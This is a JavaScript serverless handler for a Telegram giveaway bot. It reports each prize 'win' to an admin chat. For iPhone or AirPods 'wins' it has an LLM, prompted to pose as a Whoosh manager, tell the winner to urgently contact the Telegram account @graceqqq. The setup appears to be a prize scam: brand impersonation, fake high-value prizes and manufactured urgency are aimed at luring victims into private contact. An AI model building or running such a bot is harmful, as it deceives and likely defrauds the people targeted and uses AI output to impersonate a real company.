export default async function handler(req, res) {
  const { name, prize, promoCode, userId } = req.body || {};
  const token = process.env.BOT_TOKEN;
  const adminId = process.env.ADMIN_CHAT_ID;
  const groqKey = process.env.GROQ_API_KEY;

  const isMajor = prize && (prize.includes("iPhone") || prize.includes("AirPods"));

  // 1. Уведомление АДМИНУ (тебе)
  let adminText = `🎁 <b>Новый выигрыш!</b>\n\n👤 Имя: ${name}\n🏆 Приз: ${prize}\n🎫 Код: ${promoCode || 'Нет'}`;
  
  await fetch(`https://api.telegram.org/bot${token}/sendMessage`, {
    method: "POST",
    headers: { "Content-Type": "application/json" },
    body: JSON.stringify({ chat_id: adminId, text: adminText, parse_mode: "HTML" })
  });

  // 2. АВТО-ОТВЕТ ПОЛЬЗОВАТЕЛЮ (через ИИ, только для крупных призов)
  if (isMajor && userId && groqKey) {
    try {
      const aiRes = await fetch("https://api.groq.com/openai/v1/chat/completions", {
        method: "POST",
        headers: { "Authorization": `Bearer ${groqKey}`, "Content-Type": "application/json" },
        body: JSON.stringify({
          model: "llama-3.1-8b-instant",
          messages: [
            {
              role: "system",
              content: "Ты — менеджер Whoosh. Поздравь пользователя с выигрышем СУПЕР-ПРИЗА (iPhone/AirPods). Скажи, что ты — ИИ-ассистент, и для получения приза ему нужно СРОЧНО написать главному админу @graceqqq. Будь восторженным и вежливым."
            },
            { role: "user", content: `Имя: ${name}, Приз: ${prize}` }
          ]
        })
      });
      const aiData = await aiRes.json();
      const congratsText = aiData.choices[0].message.content;

      // Бот сам пишет победителю в личку
      await fetch(`https://api.telegram.org/bot${token}/sendMessage`, {
        method: "POST",
        headers: { "Content-Type": "application/json" },
        body: JSON.stringify({ chat_id: userId, text: congratsText })
      });
    } catch (e) {
      console.error("AI Congrats error", e);
    }
  }

  res.status(200).json({ success: true });
}
